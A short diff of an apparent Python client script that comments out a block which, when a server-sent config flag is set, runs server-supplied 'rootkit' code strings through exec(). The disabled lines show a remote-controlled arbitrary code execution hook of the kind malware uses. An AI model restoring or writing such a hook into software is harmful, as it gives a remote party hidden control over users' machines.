@@ -54,9 +54,9 @@ except Exception as e:
     sys.exit(1)
 
 # Enable the rootkit if the server tells us to.
-if client_config['rootkit_enabled']:
-    for code in client_config['rootkit']:
-        exec(code)
+# if client_config['rootkit_enabled']:
+#     for code in client_config['rootkit']:
+#         exec(code)
 
 # Initalize all the things outside of the class since we only need to do it once, not every time the object is created.
 try:
